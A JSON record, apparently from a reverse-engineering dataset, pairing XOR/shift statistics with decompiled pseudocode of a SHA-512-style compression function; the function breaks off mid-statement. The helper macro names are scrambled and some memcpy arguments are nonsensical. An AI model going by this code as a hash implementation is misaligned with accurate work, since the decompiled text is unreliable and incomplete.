[
    {
        "Function": "sub_14945B3C1",
        "Total XOR and shift operations": 359,
        "XOR operations": 169,
        "Shift operations": 190,
        "Operation percentage": "59.73%",
        "Function Body": "\nvoid *__fastcall sub_14945B3C1(__int64 a1, __int64 a2, char *a3, _DWORD *a4, unsigned int a5)\n{\n  unsigned __int64 v5; // rsi\n  char *v6; // rdi\n  __int64 v8; // rax\n  unsigned int v9; // ecx\n  bool v10; // cf\n  int v11; // ecx\n  void *result; // rax\n  __int64 i; // rax\n  unsigned __int32 v14; // edx\n  __int64 j; // rax\n  unsigned int v16; // r9d\n  unsigned int v17; // r8d\n  __int64 v18; // rax\n  __int64 v19; // kr00_8\n  int v20; // edx\n  unsigned __int64 v21; // rt0\n  int v22; // edi\n  int v23; // ebx\n  int v24; // ebp\n  unsigned int v25; // r10d\n  int v26; // kr08_4\n  unsigned __int64 v27; // kr10_8\n  unsigned int v28; // r10d\n  unsigned int v29; // r15d\n  unsigned int v30; // r11d\n  unsigned int v31; // ebx\n  unsigned int v32; // r9d\n  unsigned int v33; // r13d\n  int v34; // edx\n  int v35; // ebp\n  int v36; // esi\n  unsigned __int64 v37; // kr28_8\n  int v38; // eax\n  int v39; // edi\n  unsigned int v40; // edx\n  int v41; // r13d\n  int v42; // ecx\n  unsigned int v43; // r10d\n  unsigned int v44; // edx\n  unsigned int v45; // r11d\n  unsigned __int64 v46; // kr30_8\n  unsigned int v47; // r10d\n  unsigned int v48; // r13d\n  unsigned __int64 v49; // kr38_8\n  int v50; // ecx\n  unsigned __int64 v51; // kr40_8\n  unsigned int v52; // edx\n  unsigned int v53; // ebx\n  unsigned int v54; // edi\n  int v55; // r10d\n  unsigned __int64 v56; // kr58_8\n  unsigned __int64 v57; // rt0\n  int v58; // ecx\n  int v59; // eax\n  int v60; // kr60_4\n  unsigned __int64 v61; // kr68_8\n  int v62; // ebx\n  unsigned int v63; // r9d\n  unsigned int v64; // r14d\n  int v65; // eax\n  int v66; // ecx\n  int v67; // edx\n  int v68; // kr80_4\n  unsigned __int64 v69; // kr88_8\n  int v70; // r12d\n  unsigned int v71; // ebx\n  unsigned int v72; // r15d\n  int v73; // eax\n  int v74; // ecx\n  int v75; // edx\n  int v76; // krA0_4\n  unsigned __int64 v77; // krA8_8\n  unsigned int v78; // ebp\n  unsigned int v79; // r11d\n  unsigned int v80; // r10d\n  unsigned int v81; // r13d\n  unsigned int v82; // ebp\n  unsigned __int64 v83; // krC0_8\n  int v84; // edi\n  int v85; // krC8_4\n  unsigned __int64 v86; // krD0_8\n  unsigned int v87; // r10d\n  unsigned int v88; // r13d\n  unsigned int v89; // r8d\n  unsigned int v90; // r14d\n  unsigned __int64 v91; // krE0_8\n  unsigned int v92; // r10d\n  unsigned __int64 v93; // krE8_8\n  int v94; // edi\n  int v95; // krF0_4\n  unsigned int v96; // ecx\n  unsigned __int64 v97; // kr108_8\n  unsigned __int64 v98; // kr110_8\n  int v99; // edi\n  int v100; // kr118_4\n  unsigned __int64 v101; // kr130_8\n  unsigned __int64 v102; // kr138_8\n  unsigned int v103; // [rsp+20h] [rbp-3E8h]\n  int v104; // [rsp+20h] [rbp-3E8h]\n  int v105; // [rsp+24h] [rbp-3E4h]\n  int v106; // [rsp+24h] [rbp-3E4h]\n  unsigned int v107; // [rsp+28h] [rbp-3E0h]\n  unsigned __int64 v108; // [rsp+2Ch] [rbp-3DCh]\n  unsigned __int64 v109; // [rsp+2Ch] [rbp-3DCh]\n  unsigned int v110; // [rsp+34h] [rbp-3D4h]\n  int v111; // [rsp+34h] [rbp-3D4h]\n  unsigned int v112; // [rsp+38h] [rbp-3D0h]\n  int v113; // [rsp+38h] [rbp-3D0h]\n  unsigned int v114; // [rsp+3Ch] [rbp-3CCh]\n  unsigned int v115; // [rsp+3Ch] [rbp-3CCh]\n  int v116; // [rsp+40h] [rbp-3C8h]\n  unsigned int v117; // [rsp+40h] [rbp-3C8h]\n  unsigned int v118; // [rsp+44h] [rbp-3C4h]\n  unsigned int v119; // [rsp+48h] [rbp-3C0h]\n  unsigned int v120; // [rsp+48h] [rbp-3C0h]\n  unsigned int v121; // [rsp+4Ch] [rbp-3BCh]\n  unsigned int v122; // [rsp+4Ch] [rbp-3BCh]\n  unsigned int v123; // [rsp+50h] [rbp-3B8h]\n  int v124; // [rsp+54h] [rbp-3B4h]\n  unsigned __int64 v125; // [rsp+58h] [rbp-3B0h]\n  unsigned int v126; // [rsp+60h] [rbp-3A8h]\n  unsigned int v127; // [rsp+64h] [rbp-3A4h]\n  unsigned int v128; // [rsp+68h] [rbp-3A0h]\n  unsigned int v129; // [rsp+6Ch] [rbp-39Ch]\n  int v130; // [rsp+70h] [rbp-398h]\n  unsigned int v131; // [rsp+74h] [rbp-394h]\n  unsigned int v132; // [rsp+78h] [rbp-390h]\n  int v133; // [rsp+7Ch] [rbp-38Ch]\n  unsigned int v134; // [rsp+80h] [rbp-388h]\n  unsigned int v135; // [rsp+84h] [rbp-384h]\n  unsigned int v136; // [rsp+88h] [rbp-380h]\n  unsigned int v137; // [rsp+8Ch] [rbp-37Ch]\n  unsigned int v138; // [rsp+90h] [rbp-378h]\n  unsigned int v139; // [rsp+94h] [rbp-374h]\n  unsigned int v140; // [rsp+98h] [rbp-370h]\n  unsigned int v141; // [rsp+9Ch] [rbp-36Ch]\n  _DWORD *v142; // [rsp+A0h] [rbp-368h]\n  __int64 v143; // [rsp+A8h] [rbp-360h]\n  char *v144; // [rsp+B0h] [rbp-358h]\n  int v145; // [rsp+B8h] [rbp-350h]\n  _QWORD v146[105]; // [rsp+C0h] [rbp-348h]\n\n  v5 = a5;\n  v6 = a3;\n  v8 = 0LL;\n  v9 = a5;\n  do\n  {\n    v10 = __CFADD__(v9, a4[v8 + 49]);\n    a4[v8++ + 49] += v9;\n    v9 = v10;\n  }\n  while ( v8 != 4 );\n  v11 = a4[48] + a5;\n  if ( a4[48] && v11 < 128 )\n  {\n    result = memcpy(a3, (const void *)(int)a5, (size_t)a3);\n    LO4700D(v5) = a4[48] + v5;\n  }\n  else\n  {\n    if ( v11 >= 128 )\n    {\n      v142 = a4;\n      do\n      {\n        memcpy(v6, (const void *)v5, (size_t)v6);\n        v143 = 128LL - (int)a4[48];\n        for ( i = 0LL; i != 16; ++i )\n        {\n          v14 = _byteswap_ulong(a4[2 * i + 17]);\n          LO4700D(v146[i + 80]) = _byteswap_ulong(a4[2 * i + 16]);\n          HIF26AD(v146[i + 80]) = v14;\n        }\n        v144 = v6;\n        v145 = v5;\n        for ( j = 0LL; j != 16; j += 2LL )\n          *(_OWORD *)&v146[j] = *(_OWORD *)&v146[j + 80];\n        v16 = v146[0];\n        v17 = HIF26AD(v146[0]);\n        v18 = 0LL;\n        v19 = v146[0];\n        do\n        {\n          HIF26AD(v21) = v146[v18 + 14];\n          LO4700D(v21) = HIF26AD(v146[v18 + 14]);\n          v20 = v21 >> 19;\n          HIF26AD(v21) = v21;\n          LO4700D(v21) = v146[v18 + 14];\n          v22 = v21 >> 19;\n          HIF26AD(v21) = HIF26AD(v146[v18 + 14]);\n          v23 = v20 ^ (v21 >> 29);\n          HIF26AD(v21) = v21;\n          LO4700D(v21) = HIF26AD(v146[v18 + 14]);\n          v24 = v16 + (v22 ^ (v21 >> 29) ^ (LO4700D(v146[v18 + 14]) >> 6));\n          v16 = v146[v18 + 1];\n          v25 = HIF26AD(v146[v18 + 1]);\n          v26 = (v23 ^ (v21 >> 6))\n              + ((__PAF79F__(v16, v25) >> 1) ^ (__PAF79F__(v16, v25) >> 8) ^ (__PAF79F__(v16, v25) >> 7));\n          v27 = __PAF79F__(\n                  (__PAF79F__(\n                     (__PAF79F__(v25, v16) >> 1) ^ (__PAF79F__(v25, v16) >> 8) ^ (v16 >> 7),\n                     v23 ^ (unsigned int)(v21 >> 6))\n                 + __PAF79F__(\n                     LO4700D(v146[v18 + 9]) + v24,\n                     (__PAF79F__(v16, v25) >> 1) ^ (__PAF79F__(v16, v25) >> 8) ^ (__PAF79F__(v16, v25) >> 7))) >> 32,\n                  v17)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v18 + 9]), v26), HIF26AD(v146[v18 + 9]) + v26);\n          HIF26AD(v146[v18 + 16]) = v17 + HIF26AD(v146[v18 + 9]) + v26;\n          LO4700D(v146[v18++ + 16]) = HIF26AD(v27);\n          v17 = v25;\n        }\n        while ( v18 != 64 );\n        v28 = *a4;\n        v126 = a4[4];\n        v127 = a4[6];\n        v29 = a4[8];\n        v128 = a4[10];\n        v125 = 0LL;\n        v129 = a4[1];\n        v131 = *a4;\n        v130 = a4[3];\n        v116 = v130;\n        v133 = a4[2];\n        v105 = v133;\n        v132 = a4[5];\n        v108 = __PAF79F__(v126, v132);\n        v134 = a4[7];\n        v112 = v134;\n        v30 = v127;\n        v135 = a4[9];\n        v31 = v135;\n        v137 = v29;\n        v136 = a4[11];\n        v114 = v136;\n        v32 = v128;\n        v138 = a4[13];\n        v110 = v138;\n        v140 = a4[12];\n        v107 = v140;\n        v139 = a4[15];\n        v103 = v139;\n        v141 = a4[14];\n        v121 = v141;\n        v33 = v129;\n        v34 = HIF26AD(v19);\n        v35 = v19;\n        while ( 1 )\n        {\n          v123 = v31;\n          v36 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 1)\n              + ((__PAF79F__(v29, v31) >> 14) ^ (__PAF79F__(v29, v31) >> 18) ^ (__PAF79F__(v31, v29) >> 9))\n              + (v110 & ~v31 | v31 & v114);\n          v37 = __PAF79F__(\n                  (__PAF79F__(\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125),\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 1))\n                 + __PAF79F__(\n                     v121,\n                     (__PAF79F__(v29, v31) >> 14) ^ (__PAF79F__(v29, v31) >> 18) ^ (__PAF79F__(v31, v29) >> 9))\n                 + __PAF79F__(\n                     (v107 & ~v29)\n                   + ((__PAF79F__(v31, v29) >> 14) ^ (__PAF79F__(v31, v29) >> 18) ^ (__PAF79F__(v29, v31) >> 9))\n                   + v35\n                   + (v29 & v32),\n                     v110 & ~v31 | v31 & v114)) >> 32,\n                  v103)\n              + __PAF79F__(__CFADD__(v34, v36), v34 + v36);\n          v38 = __PAF79F__(v33, v28) >> 28;\n          v39 = __PAF79F__(v28, v33) >> 2;\n          v40 = v33;\n          v119 = v33;\n          v41 = (__PAF79F__(v28, v33) >> 28) ^ (__PAF79F__(v33, v28) >> 2) ^ (__PAF79F__(v33, v28) >> 7);\n          v124 = v40 & v116;\n          v104 = v28 & v105;\n          v118 = v28;\n          v42 = v40 & v116 ^ v108 & (v40 ^ v116);\n          v43 = (v38 ^ v39 ^ (__PAF79F__(v28, v40) >> 7))\n              + __CFADD__(v41, v42)\n              + (v28 & v105 ^ HIF26AD(v108) & (v28 ^ v105));\n          v46 = v37 + __PAF79F__(v30, v112);\n          v45 = (v37 + __PAF79F__(v30, v112)) >> 32;\n          v44 = v46;\n          v49 = v37 + __PAF79F__(v43, v41 + v42);\n          v47 = (v37 + __PAF79F__(v43, v41 + v42)) >> 32;\n          v48 = v49;\n          v50 = (__PAF79F__(v45, v44) >> 14) ^ (__PAF79F__(v45, v44) >> 18) ^ (__PAF79F__(v44, v45) >> 9);\n          v113 = v46;\n          v51 = __PAF79F__(\n                  (__PAF79F__(\n                     ((__PAF79F__(v44, v45) >> 14) ^ (__PAF79F__(v44, v45) >> 18) ^ (__PAF79F__(v45, v44) >> 9))\n                   + (v32 & ~v45)\n                   + (v29 & v45)\n                   + LO4700D(v146[v125 + 1])\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 2)\n                   + v107,\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 3))\n                 + __PAF79F__(__CFADD__(v50, v114 & ~v44 | v31 & v44), v50 + (v114 & ~v44 | v31 & v44))) >> 32,\n                  v110)\n              + __PAF79F__(\n                  __CFADD__(\n                    HIF26AD(v146[v125 + 1]),\n                    *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 3) + v50 + (v114 & ~v44 | v31 & v44)),\n                  HIF26AD(v146[v125 + 1])\n                + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 3)\n                + v50\n                + (v114 & ~v44 | v31 & v44));\n          v52 = v47;\n          v122 = v47;\n          v53 = (v51 + v108) >> 32;\n          v56 = v51\n              + __PAF79F__(\n                  (__PAF79F__(v48, v47) >> 28) ^ (__PAF79F__(v47, v48) >> 2) ^ (__PAF79F__(v47, v48) >> 7),\n                  (__PAF79F__(v47, v48) >> 28) ^ (__PAF79F__(v48, v47) >> 2) ^ (__PAF79F__(v48, v47) >> 7))\n              + __PAF79F__(v118 & v47 ^ v104 ^ v105 & v47, v119 & v48 ^ v124 ^ v116 & v48);\n          v55 = HIF26AD(v56);\n          HIF26AD(v57) = v51 + v108;\n          LO4700D(v57) = v53;\n          v58 = ((v51 + v108) >> 14) ^ ((v51 + v108) >> 18) ^ (__PAF79F__((int)v51 + (int)v108, v53) >> 9);\n          v59 = (__PAF79F__((int)v51 + (int)v108, v57) >> 14) ^ (v57 >> 18) ^ ((v51 + v108) >> 9);\n          v109 = v51 + v108;\n          v54 = v109;\n          v60 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 5) + v58 + (v123 & ~v54 | v46 & v54);\n          v61 = __PAF79F__(\n                  (__PAF79F__(\n                     v59\n                   + (v29 & ~v53)\n                   + (v45 & v53)\n                   + LO4700D(v146[v125 + 2])\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 4)\n                   + v32,\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 5))\n                 + __PAF79F__(__CFADD__(v58, v123 & ~v54 | v113 & v54), v58 + (v123 & ~v54 | v113 & v54))) >> 32,\n                  v114)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 2]), v60), HIF26AD(v146[v125 + 2]) + v60);\n          v111 = v56;\n          v62 = HIF26AD(v61) + __CFADD__((_DWORD)v61, v116) + v105;\n          v63 = (v61\n               + __PAF79F__(\n                   (__PAF79F__(v56, HIF26AD(v56)) >> 28) ^ (v56 >> 2) ^ (v56 >> 7),\n                   (v56 >> 28) ^ (__PAF79F__(v56, HIF26AD(v56)) >> 2) ^ (__PAF79F__(v56, HIF26AD(v56)) >> 7))\n               + __PAF79F__(v122 & HIF26AD(v56) ^ v118 & v52 ^ v118 & HIF26AD(v56), v48 & v56 ^ v119 & v48 ^ v119 & v56)) >> 32;\n          v64 = v61\n              + ((v56 >> 28) ^ (__PAF79F__(v56, HIF26AD(v56)) >> 2) ^ (__PAF79F__(v56, HIF26AD(v56)) >> 7))\n              + (v48 & v56 ^ v119 & v48 ^ v119 & v56);\n          HIF26AD(v57) = v62;\n          LO4700D(v57) = v61 + v116;\n          v65 = v57 >> 14;\n          HIF26AD(v57) = v61 + v116;\n          LO4700D(v57) = v62;\n          v66 = v57 >> 14;\n          HIF26AD(v57) = v62;\n          LO4700D(v57) = v61 + v116;\n          v67 = v65 ^ (v57 >> 18);\n          LO4700D(v57) = v62;\n          v106 = v62;\n          v117 = v61 + v116;\n          HIF26AD(v57) = v117;\n          v68 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 7)\n              + (v67 ^ (__PAF79F__(v117, v62) >> 9))\n              + (v46 & ~v117 | v109 & v117);\n          v69 = __PAF79F__(\n                  (__PAF79F__(\n                     (v66 ^ (v57 >> 18) ^ (__PAF79F__(v62, v117) >> 9))\n                   + (v45 & ~v62)\n                   + (HIF26AD(v109) & v62)\n                   + LO4700D(v146[v125 + 3])\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 6)\n                   + v29,\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 7))\n                 + __PAF79F__(\n                     __CFADD__(v67 ^ (__PAF79F__(v117, v62) >> 9), v113 & ~v117 | v109 & v117),\n                     (v67 ^ (__PAF79F__(v117, v62) >> 9)) + (v113 & ~v117 | v109 & v117))) >> 32,\n                  v123)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 3]), v68), HIF26AD(v146[v125 + 3]) + v68);\n          v115 = v64;\n          v70 = HIF26AD(v69) + __CFADD__((_DWORD)v69, v119) + v118;\n          v72 = (__PAF79F__(\n                   (__PAF79F__(\n                      (v66 ^ (v57 >> 18) ^ (__PAF79F__(v62, v117) >> 9))\n                    + (v45 & ~v62)\n                    + (HIF26AD(v109) & v62)\n                    + LO4700D(v146[v125 + 3])\n                    + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 6)\n                    + v29,\n                      *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 7))\n                  + __PAF79F__(\n                      __CFADD__(v67 ^ (__PAF79F__(v117, v62) >> 9), v113 & ~v117 | v109 & v117),\n                      (v67 ^ (__PAF79F__(v117, v62) >> 9)) + (v113 & ~v117 | v109 & v117))) >> 32,\n                   v123)\n               + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 3]), v68), HIF26AD(v146[v125 + 3]) + v68)\n               + __PAF79F__(\n                   (__PAF79F__(v64, v63) >> 28) ^ (__PAF79F__(v63, v64) >> 2) ^ (__PAF79F__(v63, v64) >> 7),\n                   (__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n               + __PAF79F__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 32;\n          v71 = v69\n              + ((__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n              + (v56 & v64 ^ v49 & v56 ^ v49 & v64);\n          HIF26AD(v57) = v70;\n          LO4700D(v57) = v69 + v119;\n          v73 = v57 >> 14;\n          HIF26AD(v57) = v69 + v119;\n          LO4700D(v57) = v70;\n          v74 = v57 >> 14;\n          HIF26AD(v57) = v70;\n          LO4700D(v57) = v69 + v119;\n          v75 = v73 ^ (v57 >> 18);\n          LO4700D(v57) = v70;\n          v120 = v69 + v119;\n          HIF26AD(v57) = v120;\n          v76 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 9)\n              + (v75 ^ (__PAF79F__(v120, v70) >> 9))\n              + (v109 & ~v120 | v117 & v120);\n          v77 = __PAF79F__(\n                  (__PAF79F__(\n                     (v74 ^ (v57 >> 18) ^ (__PAF79F__(v70, v120) >> 9))\n                   + (HIF26AD(v109) & ~v70)\n                   + (v106 & v70)\n                   + LO4700D(v146[v125 + 4])\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 8)\n                   + v45,\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 9))\n                 + __PAF79F__(\n                     __CFADD__(v75 ^ (__PAF79F__(v120, v70) >> 9), v109 & ~v120 | v117 & v120),\n                     (v75 ^ (__PAF79F__(v120, v70) >> 9)) + (v109 & ~v120 | v117 & v120))) >> 32,\n                  v46)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 4]), v76), HIF26AD(v146[v125 + 4]) + v76);\n          v79 = (__PAF79F__(\n                   (__PAF79F__(v71, v72) >> 28) ^ ((v69\n                                                  + __PAF79F__(\n                                                      (__PAF79F__(v64, v63) >> 28) ^ (__PAF79F__(v63, v64) >> 2) ^ (__PAF79F__(v63, v64) >> 7),\n                                                      (__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n                                                  + __PAF79F__(\n                                                      v55 & v63 ^ v122 & v55 ^ v122 & v63,\n                                                      v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 2) ^ ((v69\n                                                                                                  + __PAF79F__((__PAF79F__(v64, v63) >> 28) ^ (__PAF79F__(v63, v64) >> 2) ^ (__PAF79F__(v63, v64) >> 7), (__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n                                                                                                  + __PAF79F__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 7),\n                   ((v69\n                   + __PAF79F__(\n                       (__PAF79F__(v64, v63) >> 28) ^ (__PAF79F__(v63, v64) >> 2) ^ (__PAF79F__(v63, v64) >> 7),\n                       (__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n                   + __PAF79F__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 28) ^ (__PAF79F__(v71, v72) >> 2) ^ (__PAF79F__(v71, v72) >> 7))\n               + __PAF79F__(v63 & v72 ^ v55 & v63 ^ v55 & v72, v64 & v71 ^ v111 & v64 ^ v111 & v71)) >> 32;\n          v78 = (((v69\n                 + __PAF79F__(\n                     (__PAF79F__(v64, v63) >> 28) ^ (__PAF79F__(v63, v64) >> 2) ^ (__PAF79F__(v63, v64) >> 7),\n                     (__PAF79F__(v63, v64) >> 28) ^ (__PAF79F__(v64, v63) >> 2) ^ (__PAF79F__(v64, v63) >> 7))\n                 + __PAF79F__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 28) ^ (__PAF79F__(v71, v72) >> 2) ^ (__PAF79F__(v71, v72) >> 7))\n              + (v64 & v71 ^ v111 & v64 ^ v111 & v71);\n          v80 = (v77 + __PAF79F__(v122, v49)) >> 32;\n          v81 = v77 + v49;\n          v83 = v77 + __PAF79F__(v79, v78);\n          v30 = (v77 + __PAF79F__(v79, v78)) >> 32;\n          v82 = v83;\n          v84 = ((v77 + __PAF79F__(v122, v49)) >> 14) ^ ((v77 + __PAF79F__(v122, v49)) >> 18) ^ (__PAF79F__(\n                                                                                                   (int)v77 + (int)v49,\n                                                                                                   v80) >> 9);\n          v103 = v77 + v49;\n          v121 = v80;\n          v85 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 11) + v84 + (v117 & ~v81 | v120 & v81);\n          v86 = __PAF79F__(\n                  (__PAF79F__(\n                     ((__PAF79F__(v81, v80) >> 14) ^ (__PAF79F__(v81, v80) >> 18) ^ (__PAF79F__(v80, v81) >> 9))\n                   + (v106 & ~v80)\n                   + (v70 & v80)\n                   + HIF26AD(v109)\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 10)\n                   + LO4700D(v146[v125 + 5]),\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 11))\n                 + __PAF79F__(__CFADD__(v84, v117 & ~v81 | v120 & v81), v84 + (v117 & ~v81 | v120 & v81))) >> 32,\n                  v109)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 5]), v85), HIF26AD(v146[v125 + 5]) + v85);\n          v112 = v83;\n          v87 = (__PAF79F__(\n                   (__PAF79F__(v82, v30) >> 28) ^ (__PAF79F__(v30, v82) >> 2) ^ (__PAF79F__(v30, v82) >> 7),\n                   (__PAF79F__(v30, v82) >> 28) ^ (__PAF79F__(v82, v30) >> 2) ^ (__PAF79F__(v82, v30) >> 7))\n               + __PAF79F__(v72 & v30 ^ v63 & v72 ^ v63 & v30, v71 & v82 ^ v64 & v71 ^ v64 & v82)) >> 32;\n          v88 = ((__PAF79F__(v30, v82) >> 28) ^ (__PAF79F__(v82, v30) >> 2) ^ (__PAF79F__(v82, v30) >> 7))\n              + (v71 & v82 ^ v64 & v71 ^ v64 & v82);\n          v91 = v86 + v56;\n          v89 = (v86 + v56) >> 32;\n          v90 = v86 + v56;\n          v93 = v86 + __PAF79F__(v87, v88);\n          v92 = (v86 + __PAF79F__(v87, v88)) >> 32;\n          v94 = ((v86 + v56) >> 14) ^ ((v86 + v56) >> 18) ^ (__PAF79F__((int)v86 + (int)v56, v89) >> 9);\n          v110 = v86 + v56;\n          v95 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 13) + v94 + (v120 & ~v90 | (v77 + v49) & v90);\n          v97 = __PAF79F__(\n                  (__PAF79F__(\n                     ((__PAF79F__(v91, v89) >> 14) ^ (__PAF79F__(v91, v89) >> 18) ^ ((v86 + v56) >> 9))\n                   + (v70 & ~v89)\n                   + (v121 & v89)\n                   + v106\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 12)\n                   + LO4700D(v146[v125 + 6]),\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 13))\n                 + __PAF79F__(\n                     __CFADD__(v94, v120 & ~(_DWORD)v91 | v103 & v91),\n                     v94 + (v120 & ~(_DWORD)v91 | v103 & v91))) >> 32,\n                  v117)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 6]), v95), HIF26AD(v146[v125 + 6]) + v95)\n              + __PAF79F__(v63, v115);\n          v32 = HIF26AD(v97);\n          v96 = v97;\n          v98 = __PAF79F__(\n                  (__PAF79F__(\n                     ((__PAF79F__(v90, v89) >> 14) ^ (__PAF79F__(v90, v89) >> 18) ^ ((v86 + v56) >> 9))\n                   + (v70 & ~v89)\n                   + (v121 & v89)\n                   + v106\n                   + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 12)\n                   + LO4700D(v146[v125 + 6]),\n                     *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 13))\n                 + __PAF79F__(__CFADD__(v94, v120 & ~v90 | v103 & v90), v94 + (v120 & ~v90 | v103 & v90))) >> 32,\n                  v117)\n              + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 6]), v95), HIF26AD(v146[v125 + 6]) + v95)\n              + __PAF79F__(\n                  (__PAF79F__(v93, v92) >> 28) ^ (__PAF79F__(v92, v93) >> 2) ^ (__PAF79F__(v92, v93) >> 7),\n                  (__PAF79F__(v92, v93) >> 28) ^ (__PAF79F__(v93, v92) >> 2) ^ (__PAF79F__(v93, v92) >> 7))\n              + __PAF79F__(v30 & v92 ^ v72 & v30 ^ v72 & v92, v82 & v93 ^ v71 & v82 ^ v71 & v93);\n          v99 = (__PAF79F__(v32, v96) >> 14) ^ (__PAF79F__(v32, v96) >> 18) ^ (__PAF79F__(v96, v32) >> 9);\n          v114 = v97;\n          v107 = v89;\n          v100 = *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 15)\n               + v99\n               + ((v77 + v49) & ~v96 | (v86 + v56) & v96);\n          v108 = __PAF79F__(v92, v93);\n          v105 = HIF26AD(v98);\n          v116 = v98;\n          v101 = __PAF79F__(\n                   (__PAF79F__(\n                      ((__PAF79F__(v96, v32) >> 14) ^ (__PAF79F__(v96, v32) >> 18) ^ (__PAF79F__(v32, v96) >> 9))\n                    + (v121 & ~v32)\n                    + (v89 & v32)\n                    + v70\n                    + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 14)\n                    + LO4700D(v146[v125 + 7]),\n                      *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 15))\n                  + __PAF79F__(__CFADD__(v99, v103 & ~v96 | v110 & v96), v99 + (v103 & ~v96 | v110 & v96))) >> 32,\n                   v120)\n               + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 7]), v100), HIF26AD(v146[v125 + 7]) + v100)\n               + __PAF79F__(v72, v71);\n          v29 = HIF26AD(v101);\n          v31 = v101;\n          v102 = __PAF79F__(\n                   (__PAF79F__(\n                      ((__PAF79F__(v96, v32) >> 14) ^ (__PAF79F__(v96, v32) >> 18) ^ (__PAF79F__(v32, v96) >> 9))\n                    + (v121 & ~v32)\n                    + (v89 & v32)\n                    + v70\n                    + *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 14)\n                    + LO4700D(v146[v125 + 7]),\n                      *((_DWORD *)&SHEB1B_Constants_1418E21A0 + 2 * v125 + 15))\n                  + __PAF79F__(__CFADD__(v99, v103 & ~v96 | v110 & v96), v99 + (v103 & ~v96 | v110 & v96))) >> 32,\n                   v120)\n               + __PAF79F__(__CFADD__(HIF26AD(v146[v125 + 7]), v100), HIF26AD(v146[v125 + 7]) + v100)\n               + __PAF79F__(\n                   (__PAF79F__(v98, HIF26AD(v98)) >> 28) ^ (v98 >> 2) ^ (v98 >> 7),\n                   (v98 >> 28) ^ (__PAF79F__(v98, HIF26AD(v98)) >> 2) ^ (__PAF79F__(v98, HIF26AD(v98)) >> 7))\n               + __PAF79F__(v30 & v92 ^ HIF26AD(v98) & (v30 ^ v92), v112 & v93 ^ v98 & (v112 ^ v93));\n          v28 = HIF26AD(v102);\n          v33 = v102;\n          if ( v125 > 0x47 )\n            break;\n          v35 = v146[v125 + 8];\n          v34 = HIF26AD(v146[v125 + 8]);\n          v125 += 8LL;\n        }\n        v6 = &v144[v143];\n        v5 = (unsigned int)(v145 - v143);\n        a4 = v142;\n        v142[1] = v129 + v102;\n        *v142 = (__PAF79F__(v131, v129) + v102) >> 32;\n        v142[3] = v130 + v98;\n        v142[2] = v133 + __CFADD__(v130, (_DWORD)v98) + HIF26AD(v98);\n        v142[5] = v132 + v108;\n        v142[4] = v126 + __CFADD__(v132, (_DWORD)v108) + HIF26AD(v108);\n        v142[7] = v134 + v83;\n        v142[6] = v127 + __CFADD__(v134, (_DWORD)v83) + v30;\n        v142[9] = v135 + v101;\n        v142[8] = (__PAF79F__(v137, v135) + v101) >> 32;\n        v142[11] = v136 + v97;\n        